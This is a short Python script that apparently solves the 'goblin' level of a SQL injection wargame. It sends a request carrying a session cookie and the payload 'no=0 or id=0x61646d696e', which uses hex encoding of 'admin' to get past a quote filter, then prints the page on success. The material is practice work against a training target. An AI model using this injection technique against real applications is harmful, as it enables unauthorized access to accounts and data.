import requests
headers= {'Cookie':'PHPSESSID=ilbihpsvjpl9h779141vl0ve8f'}
url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20id=0x61646d696e"
r = requests.get(url, headers=headers).text
if "<h2>GOBLIN Clear!</h2>" in r:
    print(r)